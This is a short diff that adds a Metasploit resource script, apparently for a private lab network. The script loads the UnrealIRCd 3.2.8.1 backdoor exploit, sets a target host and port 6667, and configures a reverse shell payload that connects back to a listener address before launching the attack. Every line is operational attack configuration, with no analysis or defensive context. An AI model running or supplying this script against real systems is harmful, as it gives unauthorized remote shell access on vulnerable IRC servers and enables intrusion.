@@ -1,0 +1,6 @@
+use exploit/unix/irc/unreal_ircd_3281_backdoor
+set RHOST 192.168.56.102
+set RPORT 6667
+set PAYLOAD cmd/unix/reverse
+set LHOST 192.168.56.101
+exploit -z
